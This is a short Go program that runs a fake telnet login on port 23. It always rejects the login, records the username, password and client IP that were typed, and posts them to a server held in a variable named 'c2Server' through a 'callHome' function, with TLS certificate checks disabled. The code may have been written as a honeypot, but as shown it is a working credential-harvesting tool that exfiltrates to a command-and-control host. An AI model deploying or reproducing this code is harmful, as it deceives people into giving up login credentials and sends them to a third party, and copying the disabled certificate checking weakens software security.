package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"net"
	"time"
	"net/url"
	"net/http"
)

var (
	c2Server string
)

func httpsClient() *http.Client {
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{
                                InsecureSkipVerify: true,
                        },
                },
                Timeout: time.Second * 10,
        }
        return client
}

func getRequest(path string) error {
        client := httpsClient()
        resp, err := client.Get("https://" + path)
        if err != nil {
                return err
        }
        defer resp.Body.Close()
        return nil
}

func callHome(form url.Values) (error) {
	client := httpsClient()
	_ = getRequest(c2Server)
	formBody := bytes.NewBufferString(form.Encode())
	resp, err := client.Post("https://" + c2Server, "application/x-www-form-urlencoded", formBody)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func main() {
	// Listen for incoming telnet connections
	l, _ := net.Listen("tcp", ":23")
	//Clost the listner when the credentials are captured
	defer l.Close()
	for {
		//Listen for the incoming connection
		conn, err := l.Accept()
		if err != nil {
			break
		}
		//Handle connections in a new goroutine
		go handleRequest(conn)

	}

}

//Handles incoming requests.
func handleRequest(conn net.Conn) {
	credBuf := bufio.NewReader(conn)
	//conn.Write([]byte("Welcome to EmbyLinux 3.13.0-24-generic" + '\n'))
	conn.Write([]byte("Login: "))
	user, err := credBuf.ReadString('\n')
	if err != nil {
		return
	}
	conn.Write([]byte("Password: "))
	pass, err := credBuf.ReadString('\n')
	if err != nil {
		return
	}
	remove := []byte{255, 253, 3, 255, 251, 24, 255, 251, 31, 255, 251, 32, 255, 251, 33, 255, 251, 34, 255, 251, 39, 255, 253, 5, 255, 251, 35}
	bytesUser := bytes.Replace([]byte(user), remove, []byte(""), 1)
	bytesUser = bytes.Replace(bytesUser, []byte("\r\n"), []byte(""), 1)
	bytesPass := bytes.Replace([]byte(pass), []byte("\r\n"), []byte(""), 1)
	pass = string(bytesPass)
	user = string(bytesUser)
	conn.Write([]byte("Authentication Failed. Invalid Username or Password." + "\n"))
	conn.Close()
	form := url.Values {
		"connection": {"TELNET"},
		"remote_ip": {conn.RemoteAddr().String()},
		"user": {user},
		"pass": {pass},
	}
	_ = callHome(form)
}
